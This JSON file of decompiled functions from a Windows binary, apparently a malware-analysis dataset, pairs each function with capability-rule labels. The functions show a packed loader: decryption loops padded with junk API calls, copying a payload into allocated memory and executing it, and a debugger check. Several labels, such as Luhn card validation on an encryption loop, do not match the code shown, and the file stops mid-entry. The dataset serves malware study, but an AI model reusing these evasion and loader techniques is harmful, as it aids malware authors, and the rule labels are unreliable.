{
    "0040304e": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.0040304e(void)\n\n{\n    *0x5c3491 = 0x6c;\n    *0x5c348b = 0x6d;\n    *0x5c348a = 0x69;\n    *0x5c348c = 0x67;\n    *0x5c3490 = 100;\n    *0x5c3493 = 0;\n    *0x5c348d = 0x33;\n    *0x5c3489 = 0x73;\n    *0x5c3492 = 0x6c;\n    *0x5c348f = 0x2e;\n    *0x5c348e = 0x32;\n    *0x5c3488 = 0x6d;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x5c3488);\n    return;\n}\n",
        "token_count": 206
    },
    "004030b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.004030b8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t *unaff_EBX;\n    uint32_t uVar4;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar2 = *0x41322c;\n    iVar1 = *0x413228;\n    var_8h = *unaff_EBX;\n    uVar4 = unaff_EBX[1];\n    fcn.004030ae();\n    iVar3 = *0x413230;\n    var_18h = 0x23f;\n    var_20h = 0x20;\n    do {\n        if (*0x5c4754 == 0xfa9) {\n            *0x5c45b4 = 0xedeb2e40;\n        }\n        if (*0x5c4754 == 0x3eb) {\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(0);\n            *0x5c451c = 0;\n        }\n        *0x5c45b0 = 0xf4ea3dee;\n        fcn.004030b5();\n        if (*0x5c4754 == 0x9e6) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n        }\n        if (*0x5c4754 == 0x213) {\n            (*_sym.imp.KERNEL32.dll_WaitNamedPipeA)(0x402c44, 0);\n            (*_sym.imp.KERNEL32.dll_OpenJobObjectA)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_CreateHardLinkW)(0x402c98, 0x402c64, 0);\n            (*_sym.imp.KERNEL32.dll_GetFullPathNameW)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_CopyFileW)(0, 0, 0);\n        }\n        uVar4 = uVar4 - (var_8h >> 5 ^ var_8h * 0x10 + iVar3 ^ var_8h + var_18h);\n        *0x5c34bc = 0;\n        var_8h = var_8h - (uVar4 * 0x10 + iVar1 ^ var_18h + uVar4 ^ (uVar4 >> 5) + iVar2);\n        var_18h = var_18h + 0x61c88647;\n        var_20h = var_20h + -1;\n    } while (var_20h != 0);\n    unaff_EBX[1] = uVar4;\n    *unaff_EBX = var_8h;\n    return;\n}\n",
        "token_count": 685
    },
    "0040323c": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.0040323c(void)\n\n{\n    code *pcVar1;\n    uint lpDestStr;\n    uint var_418h;\n    uint var_18h;\n    uint lpNumberOfCharsWritten;\n    uint lpFileSizeHigh;\n    uint var_ch;\n    uint32_t var_8h;\n    uint dwWriteCoord;\n    \n    for (var_8h = *0x5c4754 >> 3; var_8h != 0; var_8h = var_8h - 1) {\n        if (*0x5c4754 == 0x959) {\n            (*_sym.imp.KERNEL32.dll_GetProcessWorkingSetSize)(0, 0, 0);\n            dwWriteCoord = 0;\n            (*_sym.imp.KERNEL32.dll_FillConsoleOutputCharacterA)(0, 0, 0, 0, &lpNumberOfCharsWritten);\n            pcVar1 = _sym.imp.KERNEL32.dll_WriteConsoleA;\n            (*_sym.imp.KERNEL32.dll_WriteConsoleA)(0, 0, 0, &var_ch, 0);\n            (*_sym.imp.KERNEL32.dll_LCMapStringW)(0, 0, 0, 0, &lpDestStr, 0);\n            (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x402cd4);\n            (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0);\n            (*pcVar1)(0, 0, 0, &var_18h, 0);\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesA)(&var_418h, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetFileSize)(0, &lpFileSizeHigh);\n        }\n        fcn.004030b8();\n    }\n    return;\n}\n",
        "token_count": 391
    },
    "004033c7": {
        "rules": [
            "search for credit card data/ac143e9ae29c414184a69c9308e24693",
            "parse credit card information/f44d27b3cce043409e5315cf54d1899b"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpNumberOfCharsWritten\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: lpBinaryType\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: dwWriteCoord\n\nvoid fcn.004033c7(void)\n\n{\n    code *pcVar1;\n    int32_t extraout_ECX;\n    uint *unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpClass;\n    uint lpCalData;\n    uint var_1120h;\n    uint lpVolumeNameBuffer;\n    uint var_920h;\n    uint lpCPInfoEx;\n    uint lpszVolumePathName;\n    uint lpCriticalSection;\n    uint var_114h;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint *var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint *var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint *var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint *var_8ch;\n    uint var_88h;\n    uint *var_84h;\n    uint var_80h;\n    uint *var_7ch;\n    uint *var_78h;\n    uint var_74h;\n    uint *var_70h;\n    uint *var_6ch;\n    uint *var_68h;\n    uint *var_64h;\n    uint *var_60h;\n    uint *var_5ch;\n    uint *var_58h;\n    uint *var_54h;\n    uint *var_50h;\n    uint *var_4ch;\n    uint *var_48h;\n    uint var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    uint *var_38h;\n    uint var_34h;\n    uint *lpcchClass;\n    uint *var_2ch;\n    uint lpNumberOfCharsRead;\n    uint *var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint lpNumberOfCharsWritten;\n    uint dwWriteCoord;\n    int32_t var_8h;\n    uint *lpBinaryType;\n    \n    lpBinaryType = 0x4033d4;\n    fcn.0040f260();\n    dwWriteCoord = unaff_EDI;\n    var_8h = unaff_ESI;\n    lpBinaryType = unaff_EBX;\n    if (*0x5c4754 == 0x412) {\n        lpNumberOfCharsWritten = 0x4033ee;\n        fcn.004046a3();\n        lpNumberOfCharsWritten = 0x4033f9;\n        fcn.004046b4();\n        lpNumberOfCharsWritten = 0;\n        var_14h = 0x403401;\n        fcn.00404d63(0);\n        lpNumberOfCharsWritten = 0;\n        var_14h = 0x40340c;\n        fcn.00404aca(0);\n        lpNumberOfCharsWritten = 0;\n        var_14h = 0x403413;\n        fcn.00404ae0();\n        lpNumberOfCharsWritten = 0;\n        var_14h = 0;\n        var_18h = 0x40341b;\n        fcn.00404aa3(0, 0);\n        lpNumberOfCharsWritten = 0;\n        var_14h = 0x403423;\n        fcn.00405047(0);\n    }\n    *0x5c4754 = *0x5c4754 + 0xb2d3b;\n    var_14h = 0x402cf4;\n    var_18h = 0x403438;\n    *0x5c4524 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n    var_18h = *0x5c4754;\n    var_1ch = 0;\n    var_20h = 0x40344c;\n    *0x5c4520 = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n    var_20h = 0x403456;\n    fcn.0040331d();\n    uVar2 = 0;\n    if (*0x5c4754 != 0) {\n        do {\n            (*0x5c4520)[uVar2] = *(*0x5c4758 + 0xb2d3b + uVar2);\n            if (*0x5c4754 == 0x292) {\n                var_20h = 0x402d10;\n                var_24h = NULL;\n                lpNumberOfCharsRead = 0x40348d;\n                (*_sym.imp.KERNEL32.dll_CreateJobObjectW)();\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *0x5c4754);\n    }\n    iVar3 = 0;\n    do {\n        if (*0x5c4754 + iVar3 == 0x5e) {\n            var_20h = NULL;\n            var_24h = 0x402d58;\n            lpNumberOfCharsRead = 0x4034b4;\n            (*_sym.imp.KERNEL32.dll_SetFileAttributesW)();\n            lpNumberOfCharsRead = 0;\n            var_2ch = 0x402da0;\n            lpcchClass = 0x402e0c;\n            var_34h = 0x4034c5;\n            (*_sym.imp.KERNEL32.dll_GetProfileIntW)();\n            var_34h = 0;\n            var_38h = NULL;\n            var_3ch = 0;\n            var_40h = 0x4034ce;\n            (*_sym.imp.KERNEL32.dll_AddConsoleAliasW)();\n            var_40h = NULL;\n            var_44h = 0x4034d5;\n            (*_sym.imp.KERNEL32.dll_AddAtomW)();\n            var_44h = 0;\n            var_48h = &fcn.004033c7::var_920h;\n            var_4ch = &fcn.004033c7::lpBinaryType;\n            var_50h = &fcn.004033c7::dwWriteCoord;\n            var_54h = &fcn.004033c7::var_8h;\n            var_58h = NULL;\n            var_5ch = &fcn.004033c7::lpVolumeNameBuffer;\n            var_60h = 0x402e44;\n            var_64h = 0x4034fc;\n            (*_sym.imp.KERNEL32.dll_GetVolumeInformationA)();\n            var_64h = NULL;\n            var_68h = 0x403503;\n            (*_sym.imp.KERNEL32.dll_DeleteFileA)();\n            var_68h = NULL;\n            var_6ch = NULL;\n            var_70h = NULL;\n            var_74h = 0x40350c;\n            (*_sym.imp.KERNEL32.dll_GlobalReAlloc)();\n            var_74h = 0;\n            var_78h = NULL;\n            var_7ch = &fcn.004033c7::lpszVolumePathName;\n            var_80h = 0x40351b;\n            (*_sym.imp.KERNEL32.dll_lstrcpynA)();\n            var_80h = 0x402e60;\n            var_84h = 0x403526;\n            (*_sym.imp.KERNEL32.dll_lstrlenA)();\n            var_84h = &fcn.004033c7::lpNumberOfCharsWritten;\n            var_88h = 0;\n            var_8ch = &fcn.004033c7::lpCalData;\n            var_90h = 0;\n            var_94h = 0;\n            var_98h = 0;\n            var_9ch = 0x40353b;\n            (*_sym.imp.KERNEL32.dll_GetCalendarInfoW)();\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x40c893);\n    iVar3 = 0;\n    do {\n        var_20h = 0x403550;\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 < 0x1b92e51) {\n            var_f8h = 0x4610f018;\n            var_6ch = 0xeaf5fe12;\n            var_34h = 0x6e6024ec;\n            var_b8h = 0xe5ddf081;\n            var_50h = 0x60c24301;\n            var_dch = 0xf11699c6;\n            lpcchClass = 0x5447e6cd;\n            var_38h = 0xf7f9bc7a;\n            var_1ch = 0xe40a86e5;\n            var_84h = 0xba9260d4;\n            var_4ch = 0x28677973;\n            var_60h = 0x22568126;\n            var_2ch = 0x7fa22f5c;\n            var_a8h = 0x1836c344;\n            var_24h = 0x3f3bd8f9;\n            var_bch = 0xad0e06c1;\n            var_a0h = 0x946a0ac2;\n            lpNumberOfCharsRead = 0xd30b5288;\n            var_9ch = 0xb4ec71c;\n            var_8ch = 0xee20648;\n            var_98h = 0x16e008c9;\n            var_48h = 0x4f9aa4b4;\n            var_ach = 0xfb6ee96c;\n            var_70h = 0x157a7ce7;\n            var_c8h = 0x4bbf74a5;\n            lpNumberOfCharsWritten = 0x56461fc4;\n            var_100h = 0x976a7c8e;\n            var_c0h = 0xc5cbd29c;\n            var_b0h = 0xd718b2d0;\n            var_e8h = 0x16495cb1;\n            var_7ch = 0xd3a9ace6;\n            var_d4h = 0x26e806d9;\n            var_ech = 0x898eada6;\n            var_68h = 0x1edeebb1;\n            var_54h = 0x10404e7d;\n            var_74h = 0x251f8861;\n            var_c4h = 0xae259a1f;\n            var_8h = 0x28b8362c;\n            var_f0h = 0xf1630d82;\n            var_94h = 0x6b3f9590;\n            var_40h = 0x3b3e2936;\n            lpBinaryType = 0xe8e47dec;\n            dwWriteCoord = 0x9344d4a8;\n            var_d8h = 0xcbf393e7;\n            var_b4h = 0x2e7b0477;\n            var_e0h = 0x2361292f;\n            var_58h = 0x2693bce5;\n            var_cch = 0x41e09b7c;\n            var_88h = 0x887fe3d7;\n            var_108h = 0x21775d98;\n            var_f4h = 0xa3e05920;\n            var_44h = 0x5fb64cf4;\n            var_18h = 0x2f4d07f0;\n            var_104h = 0x13c32aee;\n            var_e4h = 0x21d5b70a;\n            var_90h = 0x675793c9;\n            var_3ch = 0xc3a50564;\n            var_78h = 0x79cd39fd;\n            var_5ch = 0x5d309f77;\n            var_d0h = 0xc96a4ef3;\n            var_64h = 0xe0537d5f;\n            var_14h = 0xfa80f583;\n            var_80h = 0xbd51bf5f;\n            var_fch = 0xffe8cb61;\n            var_a4h = 0xd65999e2;\n        }\n        var_20h = 0x403ef9;\n        (*_sym.imp.KERNEL32.dll_GetSystemDefaultLangID)();\n    } while ((iVar3 < 0x1b3afd6) && (iVar3 = iVar3 + 1,  iVar3 < 0x1715fa10));\n    var_20h = 0x403f13;\n    fcn.0040323c();\n    iVar3 = 0;\n    do {\n        if (iVar3 == 0x770e) {\n            var_20h = 0x403f22;\n            fcn.00403303();\n            iVar3 = extraout_ECX;\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x286b97d);\n    iVar3 = 0x7b;\n    do {\n        if (*0x5c4754 == 0x86) {\n            var_20h = &fcn.004033c7::lpszVolumePathName;\n            var_24h = NULL;\n            lpNumberOfCharsRead = 0x402e68;\n            var_2ch = 0x403f4d;\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)();\n            var_2ch = &fcn.004033c7::lpBinaryType;\n            lpcchClass = NULL;\n            var_34h = 0x403f58;\n            (*_sym.imp.KERNEL32.dll_GetBinaryTypeW)();\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_GetFileAttributesA;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_8h = 0x184cc;\n    do {\n        if (*0x5c4754 == 0x1833b) {\n            var_20h = NULL;\n            var_24h = &fcn.004033c7::lpszVolumePathName;\n            lpNumberOfCharsRead = 0x402e78;\n            var_2ch = 0x403f8b;\n            (*_sym.imp.KERNEL32.dll_GetVolumePathNameA)();\n            var_2ch = NULL;\n            lpcchClass = 0x403f92;\n            (*_sym.imp.KERNEL32.dll_FindNextChangeNotification)();\n            lpcchClass = &fcn.004033c7::lpCriticalSection;\n            var_34h = 0x403f9f;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n            var_34h = 0;\n            var_38h = &fcn.004033c7::lpNumberOfCharsWritten;\n            var_3ch = 0;\n            var_40h = &fcn.004033c7::lpVolumeNameBuffer;\n            var_44h = 0;\n            var_48h = 0x403fb3;\n            (*_sym.imp.KERNEL32.dll_WriteConsoleW)();\n            var_48h = 0x402ea0;\n            var_4ch = 0x403fba;\n            (*pcVar1)();\n            var_4ch = NULL;\n            var_50h = NULL;\n            var_54h = 0x403fc2;\n            (*_sym.imp.KERNEL32.dll_GetComputerNameW)();\n            var_54h = lpBinaryType;\n            var_58h = &fcn.004033c7::var_20h;\n            var_5ch = &fcn.004033c7::var_18h;\n            var_60h = &fcn.004033c7::var_34h;\n            var_64h = &fcn.004033c7::var_24h;\n            var_68h = &fcn.004033c7::var_14h;\n            var_6ch = &fcn.004033c7::var_1ch;\n            var_70h = &fcn.004033c7::var_38h;\n            var_74h = 0;\n            var_78h = &fcn.004033c7::lpcchClass;\n            var_7ch = &fcn.004033c7::lpClass;\n            var_80h = 0;\n            var_84h = 0x403ff4;\n            (*_sym.imp.ADVAPI32.dll_RegQueryInfoKeyW)();\n            var_84h = &fcn.004033c7::lpCPInfoEx;\n            var_88h = 0;\n            var_8ch = NULL;\n            var_90h = 0x404003;\n            (*_sym.imp.KERNEL32.dll_GetCPInfoExW)();\n            var_90h = 0;\n            var_94h = 0;\n            var_98h = 0x40400b;\n            (*_sym.imp.KERNEL32.dll_TlsSetValue)();\n            var_98h = 0;\n            var_9ch = 0;\n            var_a0h = 0;\n            var_a4h = 0;\n            var_a8h = 0x404015;\n            (*_sym.imp.KERNEL32.dll_SetFirmwareEnvironmentVariableA)();\n            var_a8h = 0;\n            var_ach = 0;\n            var_b0h = &fcn.004033c7::var_1120h;\n            var_b4h = 0x404024;\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesA)();\n            var_b4h = 0;\n            var_b8h = 0;\n            var_bch = 0x40402c;\n            (*_sym.imp.KERNEL32.dll_EnumSystemCodePagesA)();\n            lpBinaryType = NULL;\n            var_bch = &fcn.004033c7::lpNumberOfCharsRead;\n            var_c0h = 0;\n            var_c4h = 0;\n            var_c8h = 0;\n            var_cch = 0;\n            var_d0h = 0x404047;\n            (*_sym.imp.KERNEL32.dll_ReadConsoleOutputCharacterA)();\n            var_d0h = 0;\n            var_d4h = 0x40404a;\n            (*pcVar1)();\n            var_d4h = 0;\n            var_d8h = 0;\n            var_dch = 0;\n            var_e0h = 0x404053;\n            (*_sym.imp.KERNEL32.dll_GetVolumeNameForVolumeMountPointW)();\n            dwWriteCoord = 0;\n            var_e0h = &fcn.004033c7::var_2ch;\n            var_e4h = 0;\n            var_e8h = 0;\n            var_ech = 0;\n            var_f0h = 0;\n            var_f4h = 0x40406e;\n            (*_sym.imp.KERNEL32.dll_FillConsoleOutputCharacterA)();\n            var_f4h = 0;\n            var_f8h = 0;\n            var_fch = 0;\n            var_100h = 0;\n            var_104h = 0;\n            var_108h = 0x404079;\n            (*_sym.imp.KERNEL32.dll_FoldStringW)();\n        }\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    var_20h = 0x404087;\n    fcn.0040304e();\n    var_20h = 0x40408d;\n    (**0x5c4520)();\n    return;\n}\n",
        "token_count": 4588
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    int32_t iVar1;\n    uint lpNumberOfCharsWritten;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_58h = 0xaa5b3950;\n    var_68h = 0x61485f3a;\n    var_8h = 0x8028c08e;\n    var_ch = 0xf553fa5c;\n    var_10h = 0x526b10a1;\n    var_38h = 0x2605108f;\n    var_1ch = 0x931e82a6;\n    var_4h = 0x99d63131;\n    var_3ch = 0x6126a1d4;\n    var_2ch = 0x6584846c;\n    var_20h = 0x5ce95719;\n    var_40h = 0xef5778b8;\n    var_50h = 0x642476ef;\n    var_6ch = 0x3cffa39a;\n    var_28h = 0x4abb1d81;\n    var_4ch = 0x47d1edb0;\n    var_30h = 0x71c41c;\n    var_34h = 0x788d029e;\n    var_54h = 0x6274162f;\n    var_70h = 0xf906f3de;\n    var_60h = 0x97b147e7;\n    var_74h = 0x6d64d5a2;\n    var_64h = 0xeb3812d8;\n    var_44h = 0xab3e3b2b;\n    var_18h = 0x1f78b6d9;\n    var_48h = 0x8212a494;\n    var_14h = 0x91e17d73;\n    var_5ch = 0x2448001;\n    var_24h = 0x56dd899d;\n    if (*0x5c4754 == 0x20) {\n        (*_sym.imp.KERNEL32.dll_WriteConsoleW)(0, 0, 0, &lpNumberOfCharsWritten, 0);\n        (*_sym.imp.KERNEL32.dll_OpenJobObjectA)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_SetThreadPriority)(0, 0);\n        fcn.00403040();\n        fcn.00404893(0);\n        fcn.00404804(0, 0);\n        fcn.0040466f(0);\n        fcn.00404c33(0, 0, 0);\n        fcn.004046f8(0, 0);\n    }\n    iVar1 = 0;\n    do {\n        if (iVar1 - 0x5b9bU < 2) {\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0x402eb4);\n        }\n        (*_sym.imp.KERNEL32.dll_TransactNamedPipe)(0, 0, 0, 0, 0, 0, 0);\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0xe3a7);\n    *0x5c4754 = *0x4283bc;\n    *0x5c4758 = *0x42741c;\n    fcn.004033c7();\n    return 0;\n}\n",
        "token_count": 960
    },
    "004046b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004046b4(uint *param_1)\n\n{\n    *param_1 = 0x401230;\n    if (param_1[2] != 0) {\n        fcn.004058f5(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "00404f1b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040500e: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00405013)\n// WARNING: Removing unreachable block (ram,0x00405041)\n// WARNING: Removing unreachable block (ram,0x00405019)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404f1b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405f24(0x411010, 0x18);\n    fcn.004063a6(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x5c2a10 != 1) {\n        *0x5c2a0c = 1;\n        *0x5c2a08 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00407b6b(*0x5c58d0);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00407b6b(*0x5c58cc);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00407b62();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00407b6b(*piVar2);\n                        iVar3 = fcn.00407b62();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00407b6b(*0x5c58d0);\n                        piVar1 = fcn.00407b6b(*0x5c58cc);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00404e55(0x4011e8);\n        }\n        fcn.00404e55(0x4011f0);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.004062cc(8);\n    }\n    return;\n}\n",
        "token_count": 814
    },
    "00405322": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405322(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x412cac) {\n        return;\n    }\n    *0x5c3150 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x5c3154 = &arg_8h;\n    *0x5c3090 = 0x10001;\n    *0x5c3038 = 0xc0000409;\n    *0x5c303c = 1;\n    var_328h = *0x412cac;\n    var_324h = *0x412cb0;\n    *0x5c3044 = unaff_retaddr;\n    *0x5c311c = in_GS;\n    *0x5c3120 = in_FS;\n    *0x5c3124 = in_ES;\n    *0x5c3128 = in_DS;\n    *0x5c312c = unaff_EDI;\n    *0x5c3130 = unaff_ESI;\n    *0x5c3134 = unaff_EBX;\n    *0x5c3138 = in_EDX;\n    *0x5c313c = in_ECX;\n    *0x5c3140 = in_EAX;\n    *0x5c3144 = unaff_EBP;\n    *0x5c3148 = unaff_retaddr;\n    *0x5c314c = in_CS;\n    *0x5c3158 = in_SS;\n    *0x5c3088 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040b29b(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x4019b4);\n    if (*0x5c3088 == 0) {\n        fcn.0040b29b(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 848
    },
    "0040a84e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040a84e(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.004062cc(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0040bfcf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
